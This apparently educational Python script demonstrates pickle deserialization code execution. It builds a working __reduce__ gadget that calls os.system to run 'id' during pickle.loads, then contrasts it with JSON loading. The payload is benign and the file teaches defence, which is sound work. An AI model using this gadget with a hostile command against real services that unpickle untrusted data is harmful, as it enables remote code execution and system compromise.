#!/usr/bin/env python3
"""
Educational demo: why pickle.load is code execution.

HARMLESS. The payload runs `id` and writes a proof file to the system temp dir;
it does nothing destructive and contacts no network. It exists so defenders can
see the __reduce__ mechanism fire and see that a data-only loader is immune.
Authorized and educational use only.
Writeup: https://jperezduerto.info/techniques/pickle-deserialization-rce/

    python3 reduce_demo.py          # demonstrate the pickle sink, then a safe path
"""
import os
import pickle
import tempfile

PROOF = os.path.join(tempfile.gettempdir(), "pickle-proof")


class Demo:
    # On unpickling, pickle calls what __reduce__ returns. This is the gadget.
    def __reduce__(self):
        return (os.system, (f"id > {PROOF} 2>&1",))


def show_sink():
    blob = pickle.dumps(Demo())
    print(f"[*] pickled payload is {len(blob)} bytes of seemingly inert data")
    print("[*] calling pickle.loads on it (this is the RCE sink)...")
    pickle.loads(blob)  # <-- runs `id` as this process
    if os.path.exists(PROOF):
        with open(PROOF) as fh:
            print(f"[!] code ran during deserialization -> {fh.read().strip()}")
        os.remove(PROOF)


def show_safe():
    # The fix is not "scan the pickle"; it is "do not unpickle untrusted data".
    import json
    safe = json.dumps({"value": 42})          # data-only, no code can hide here
    print(f"[+] json.loads on the same kind of data is inert -> {json.loads(safe)}")


if __name__ == "__main__":
    show_sink()
    show_safe()
    print("\nTakeaway: any pickle.load on attacker-influenced bytes is RCE. "
          "Use JSON / a schema / safetensors across trust boundaries.")
